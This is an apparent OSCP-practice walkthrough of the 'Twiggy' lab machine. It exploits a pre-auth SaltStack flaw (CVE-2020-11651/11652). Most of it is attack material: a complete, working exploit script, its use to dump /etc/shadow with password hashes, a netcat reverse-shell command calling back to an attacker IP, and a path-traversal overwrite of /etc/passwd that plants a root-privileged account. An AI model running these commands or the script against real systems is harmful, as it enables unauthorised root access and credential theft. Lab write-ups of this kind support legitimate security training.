---
title: OSCP Twiggy - A Playground Practice machine
author: amandaguglieri
draft: false
TableOfContents: true
Date: 20250903
tags:
  - walkthrough
---

# OSCP Twiggy - A Playground Practice machine


## Description

**Proving Grounds Practice**: In this lab, we will gain access by exploiting a pre-auth remote code execution vulnerability on a SaltStack master. This will allow us to execute commands on the master by creating a runner of salt.cmd using the cmd.exec_code function. This exercise enhances your skills in exploiting vulnerabilities for command execution and system access.


## proof.txt

```bash
nmap 192.168.111.62
```

Output:

```
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
8000/tcp open  http-alt
```

Deeper enumeration:

```bash
sudo nmap -p- -sC -sV 192.168.111.62  -Pn
```

Output:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1

```

Open the browser and navigate to  IP:80. There is Mezzanine site, an open source content management platform.

Open the browser and navigate to  IP:8000. There is a CherryPy 5.6.0 installation. Enumerate with ffuf:

```bash
ffuf -u http://192.168.111.62:8000/FUZZ -w /usr/share/wordlists/rockyou.txt -fs 1455,146
```

Output:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.111.62:8000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1455,146
________________________________________________

login                   [Status: 200, Size: 43, Words: 6, Lines: 1, Duration: 55ms]
events                  [Status: 401, Size: 753, Words: 155, Lines: 31, Duration: 55ms]
minions                 [Status: 401, Size: 753, Words: 155, Lines: 31, Duration: 43ms]

```

Capture the request with Burpsuite:

```bash
GET /login HTTP/1.1
Host: 192.168.111.62:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_id=d4e6de84321e8d66c1c8f4591dab3f3ce9c71e7e
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

The response included an uncommon header: X-Upstream: salt-api/3000-1:

```
HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Thu, 04 Sep 2025 20:28:37 GMT
Content-Type: application/json
Content-Length: 43
Connection: keep-alive
Access-Control-Expose-Headers: GET, POST
Vary: Accept-Encoding
Allow: GET, HEAD, POST
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
Www-Authenticate: Session
Set-Cookie: session_id=68da2381a866f5e12ebd90ebd0245b61e0b834a7; expires=Fri, 05 Sep 2025 06:28:37 GMT; Path=/
X-Upstream: salt-api/3000-1

{"status": null, "return": "Please log in"}
```

A quick search on google returns this PoC # [CVE-2020-11651](https://github.com/jasperla/CVE-2020-11651-poc) An issue was discovered in SaltStack Salt before 2019.2.4 and 3000 before 3000.2. The salt-master process ClearFuncs class does not properly validate method calls. This allows a remote user to access some methods without authentication. These methods can be used to retrieve user tokens from the salt master and/or run arbitrary commands on salt minions.

Install PoC:

```bash
git clone https://github.com/jasperla/CVE-2020-11651-poc.git
cd CVE-2020-11651-poc
```

The scripts requires some fixes. Final script with python 3.11.9 is:

```python
#!/usr/bin/env python
#
# Exploit for CVE-2020-11651 and CVE-2020-11652
# Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc)
# This exploit is based on this checker script:
# https://github.com/rossengeorgiev/salt-security-backports

from __future__ import absolute_import, print_function, unicode_literals
import argparse
import datetime
import os
import os.path
import sys
import time
import builtins

import salt
import salt.utils.stringutils
import salt.version
import salt.transport.client
import salt.exceptions


builtins.__salt_system_encoding__ = "utf-8"
if not hasattr(salt.utils.stringutils, "__salt_system_encoding__"):
    salt.utils.stringutils.__salt_system_encoding__ = "utf-8"


def init_minion(master_ip, master_port):
    minion_config = {
        'transport': 'zeromq',
        'pki_dir': '/tmp',
        'id': 'root',
        'log_level': 'debug',
        'master_ip': master_ip,
        'master_port': master_port,
        'auth_timeout': 5,
        'auth_tries': 1,
        'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port)
    }

    return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')

# --- check funcs ----

def check_connection(master_ip, master_port, channel):
  print("[+] Checking salt-master ({}:{}) status... ".format(master_ip, master_port), end='')
  sys.stdout.flush()

  # connection check
  try:
    channel.send({'cmd':'ping'}, timeout=2)
  except salt.exceptions.SaltReqTimeoutError:
    print("OFFLINE")
    sys.exit(1)
  else:
    print("ONLINE")

def check_CVE_2020_11651(channel):
  print("[+] Checking if vulnerable to CVE-2020-11651... ", end='')
  sys.stdout.flush()

  try:
    rets = channel.send({'cmd': '_prep_auth_info'}, timeout=3)
  except:
    print('ERROR')
    return None
  else:
    pass
  finally:
    if rets:
      print('YES')
      root_key = rets[2]['root']
      return root_key

  print('NO')
  return None

def check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path):
  print("[+] Checking if vulnerable to CVE-2020-11652 (read_token)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'cmd': 'get_token',
    'arg': [],
    'token': top_secret_file_path,
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("YES")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)
    print("NO")
  
def check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key):
  print("[+] Checking if vulnerable to CVE-2020-11652 (read)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'file_roots.read',
    'path': top_secret_file_path,
    'saltenv': 'base',
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)
    if rets['data']['return']:
      print("YES")
    else:
      print("NO")

def check_CVE_2020_11652_write1(debug, channel, root_key):
  print("[+] Checking if vulnerable to CVE-2020-11652 (write1)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'file_roots.write',
    'path': '../../../../../../../../tmp/salt_CVE_2020_11652',
    'data': 'evil',
    'saltenv': 'base',
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)

    pp(rets)
    if rets['data']['return'].startswith('Wrote'):
      try:
        os.remove('/tmp/salt_CVE_2020_11652')
      except OSError:
        print("Maybe?")
      else:
        print("YES")
    else:
      print("NO")

def check_CVE_2020_11652_write2(debug, channel, root_key):
  print("[+] Checking if vulnerable to CVE-2020-11652 (write2)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'config.update_config',
    'file_name': '../../../../../../../../tmp/salt_CVE_2020_11652',
    'yaml_contents': 'evil',
    'saltenv': 'base',
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)
    if rets['data']['return'].startswith('Wrote'):
      try:
        os.remove('/tmp/salt_CVE_2020_11652.conf')
      except OSError:
        print("Maybe?")
      else:
        print("YES")
    else:
      print("NO")

def pwn_read_file(channel, root_key, path, master_ip):
    print("[+] Attemping to read {} from {}".format(path, master_ip))
    sys.stdout.flush()

    msg = {
        'key': root_key,
        'cmd': 'wheel',
        'fun': 'file_roots.read',
        'path': path,
        'saltenv': 'base',
    }

    rets = channel.send(msg, timeout=3)
    print(rets['data']['return'][0][path])

def pwn_upload_file(channel, root_key, src, dest, master_ip):
    print("[+] Attemping to upload {} to {} on {}".format(src, dest, master_ip))
    sys.stdout.flush()

    try:
        fh = open(src, 'rb')
        payload = fh.read()
        fh.close()
    except Exception as e:
        print('[-] Failed to read {}: {}'.format(src, e))
        return

    msg = {
        'key': root_key,
        'cmd': 'wheel',
        'fun': 'file_roots.write',
        'saltenv': 'base',
        'data': payload,
        'path': dest,
    }

    rets = channel.send(msg, timeout=3)
    print('[ ] {}'.format(rets['data']['return']))

def pwn_exec(channel, root_key, cmd, master_ip, jid):
    print("[+] Attemping to execute {} on {}".format(cmd, master_ip))
    sys.stdout.flush()

    msg = {
        'key': root_key,
        'cmd': 'runner',
        'fun': 'salt.cmd',
        'saltenv': 'base',
        'user': 'sudo_user',
        'kwarg': {
            'fun': 'cmd.exec_code',
            'lang': 'python',
            'code': "import subprocess;subprocess.call('{}',shell=True)".format(cmd)
        },
        'jid': jid,
    }

    try:
        rets = channel.send(msg, timeout=3)
    except Exception as e:
        print('[-] Failed to submit job')
        return

    if rets.get('jid'):
        print('[+] Successfully scheduled job: {}'.format(rets['jid']))

def pwn_exec_all(channel, root_key, cmd, master_ip, jid):
    print("[+] Attemping to execute '{}' on all minions connected to {}".format(cmd, master_ip))
    sys.stdout.flush()

    msg = {
        'key': root_key,
        'cmd': '_send_pub',
        'fun': 'cmd.run',
        'user': 'root',
        'arg': [ "/bin/sh -c '{}'".format(cmd) ],
        'tgt': '*',
        'tgt_type': 'glob',
        'ret': '',
        'jid': jid
    }

    try:
        rets = channel.send(msg, timeout=3)
    except Exception as e:
        print('[-] Failed to submit job')
        return
    finally:
        if rets == None:
            print('[+] Successfully submitted job to all minions.')
        else:
            print('[-] Failed to submit job')


def main():
    parser = argparse.ArgumentParser(description='Saltstack exploit for CVE-2020-11651 and CVE-2020-11652')
    parser.add_argument('--master', '-m', dest='master_ip', default='127.0.0.1')
    parser.add_argument('--port', '-p', dest='master_port', default='4506')
    parser.add_argument('--force', '-f', dest='force', default=False, action='store_false')
    parser.add_argument('--debug', '-d', dest='debug', default=False, action='store_true')
    parser.add_argument('--run-checks', '-c', dest='run_checks', default=False, action='store_true')
    parser.add_argument('--read', '-r', dest='read_file')
    parser.add_argument('--upload-src', dest='upload_src')
    parser.add_argument('--upload-dest', dest='upload_dest')
    parser.add_argument('--exec', dest='exec', help='Run a command on the master')
    parser.add_argument('--exec-all', dest='exec_all', help='Run a command on all minions')
    args = parser.parse_args()

    print("[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.")
    time.sleep(1)

    # Both src and destination are required for uploads
    if (args.upload_src and args.upload_dest is None) or (args.upload_dest and args.upload_src is None):
        print('[-] Must provide both --upload-src and --upload-dest')
        sys.exit(1)

    channel = init_minion(args.master_ip, args.master_port)

    check_connection(args.master_ip, args.master_port, channel)
    
    root_key = check_CVE_2020_11651(channel)
    if root_key:
        print('[*] root key obtained: {}'.format(root_key))
    else:
        print('[-] Failed to find root key...aborting')
        sys.exit(127)

    if args.run_checks:
        # Assuming this check runs on the master itself, create a file with "secret" content
        # and abuse CVE-2020-11652 to read it.
        top_secret_file_path = '/tmp/salt_cve_teta'
        with salt.utils.fopen(top_secret_file_path, 'w') as fd:
            fd.write("top secret")

        # Again, this assumes we're running this check on the master itself
        with salt.utils.fopen('/var/cache/salt/master/.root_key') as keyfd:
            root_key = keyfd.read()

        check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path)
        check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key)
        check_CVE_2020_11652_write1(debug, channel, root_key)
        check_CVE_2020_11652_write2(debug, channel, root_key)
        os.remove(top_secret_file_path)
        sys.exit(0)

    if args.read_file:
        pwn_read_file(channel, root_key, args.read_file, args.master_ip)

    if args.upload_src:
        if os.path.isabs(args.upload_dest):
            print('[-] Destination path must be relative; aborting')
            sys.exit(1)
        pwn_upload_file(channel, root_key, args.upload_src, args.upload_dest, args.master_ip)


    jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow())

    if args.exec:
        pwn_exec(channel, root_key, args.exec, args.master_ip, jid)

    if args.exec_all:
        print("[!] Lester, is this what you want? Hit ^C to abort.")
        time.sleep(2)
        pwn_exec_all(channel, root_key, args.exec_all, args.master_ip, jid)


if __name__ == '__main__':
    main()
```

README document provides helpful tips about execution.

Download shadow file:

```bash
python3 exploit.py --master 192.168.111.62 -r /etc/shadow
```

Output:

```
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/share/twiggy/CVE-2020-11651/salt/salt/utils/gitfs.py:149: DeprecationWarning: distutils Version classes are deprecated. Use packaging.version instead.
  GITPYTHON_MINVER = _LooseVersion("0.3")
/home/kali/share/twiggy/CVE-2020-11651/salt/salt/transport/zeromq.py:44: DeprecationWarning: zmq.eventloop.ioloop is deprecated in pyzmq 17. pyzmq now works with default tornado and asyncio eventloops.
  import zmq.eventloop.ioloop
[+] Checking salt-master (192.168.111.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skNXpMmON4009lLtSZ9DRlk=
[+] Attemping to read /etc/shadow from 192.168.111.62
root:$6$WT0RuvyM$WIZ6pBFcP7G4pz/jRYY/LBsdyFGIiP3SLl0p32mysET9sBMeNkDXXq52becLp69Q/Uaiu8H0GxQ31XjA8zImo/:18400:0:99999:7:::
bin:*:17834:0:99999:7:::
daemon:*:17834:0:99999:7:::
adm:*:17834:0:99999:7:::
lp:*:17834:0:99999:7:::
sync:*:17834:0:99999:7:::
shutdown:*:17834:0:99999:7:::
halt:*:17834:0:99999:7:::
mail:*:17834:0:99999:7:::
operator:*:17834:0:99999:7:::
games:*:17834:0:99999:7:::
ftp:*:17834:0:99999:7:::
nobody:*:17834:0:99999:7:::
systemd-network:!!:18400::::::
dbus:!!:18400::::::
polkitd:!!:18400::::::
sshd:!!:18400::::::
postfix:!!:18400::::::
chrony:!!:18400::::::
mezz:!!:18400::::::
nginx:!!:18400::::::
named:!!:18400::::::
```

Download passwd file:

```bash
python3 exploit.py --master 192.168.111.62 -r /etc/passwd
```

Output:

```
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/share/twiggy/CVE-2020-11651/salt/salt/utils/gitfs.py:149: DeprecationWarning: distutils Version classes are deprecated. Use packaging.version instead.
  GITPYTHON_MINVER = _LooseVersion("0.3")
/home/kali/share/twiggy/CVE-2020-11651/salt/salt/transport/zeromq.py:44: DeprecationWarning: zmq.eventloop.ioloop is deprecated in pyzmq 17. pyzmq now works with default tornado and asyncio eventloops.
  import zmq.eventloop.ioloop
[+] Checking salt-master (192.168.111.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skNXpMmON4009lLtSZ9DRlk=
[+] Attemping to read /etc/passwd from 192.168.111.62
root:x:0:0:root:/root:/bin/bash
root2:$1$Y/jF814t$FJv0Wq8N1CyPLC4hkPTSg.:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin

```

Set a listener in the attacker machine:

```bash
nc -lnvp 1234
```

Run a reverse shell:

```bash
python3 exploit.py --master 192.168.111.62 --exec "nc 192.168.45.209 1234 -e /bin/sh"
```

Output:

```
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/share/twiggy/CVE-2020-11651/salt/salt/utils/gitfs.py:149: DeprecationWarning: distutils Version classes are deprecated. Use packaging.version instead.
  GITPYTHON_MINVER = _LooseVersion("0.3")
/home/kali/share/twiggy/CVE-2020-11651/salt/salt/transport/zeromq.py:44: DeprecationWarning: zmq.eventloop.ioloop is deprecated in pyzmq 17. pyzmq now works with default tornado and asyncio eventloops.
  import zmq.eventloop.ioloop
[+] Checking salt-master (192.168.111.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skNXpMmON4009lLtSZ9DRlk=
[+] Attemping to execute nc 192.168.45.209 1234 -e /bin/sh on 192.168.111.62
[+] Successfully scheduled job: 20250904220223637740
```

There was no execution on the listener. 

A different strategy is generating a new password hash and uploading a passwd file with the new user:

```bash
openssl passwd Lalala123
```

Output:

```
$1$Y/jF814t$FJv0Wq8N1CyPLC4hkPTSg.
```

Append a new root user entry in `passwd`:

```bash
root:x:0:0:root:/root:/bin/bash
root2:$1$Y/jF814t$FJv0Wq8N1CyPLC4hkPTSg.:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin
```

Upload the modified passwd file back to the target:

```bash
python3 exploit.py --master 192.168.111.62 --upload-src ../passwd --upload-dest  ../../../../../../../../../../../etc/passwd
```

Output:

```
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/share/twiggy/CVE-2020-11651/salt/salt/utils/gitfs.py:149: DeprecationWarning: distutils Version classes are deprecated. Use packaging.version instead.
  GITPYTHON_MINVER = _LooseVersion("0.3")
/home/kali/share/twiggy/CVE-2020-11651/salt/salt/transport/zeromq.py:44: DeprecationWarning: zmq.eventloop.ioloop is deprecated in pyzmq 17. pyzmq now works with default tornado and asyncio eventloops.
  import zmq.eventloop.ioloop
[+] Checking salt-master (192.168.111.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skNXpMmON4009lLtSZ9DRlk=
[+] Attemping to upload ../passwd to ../../../../../../../../../../../etc/passwd on 192.168.111.62
[ ] Wrote data to file /srv/salt/../../../../../../../../../../../etc/passwd

```

SSH into the new account:

```bash
ssh root2@192.168.111.62
```

Print the proof:

```
cat proof.txt
```

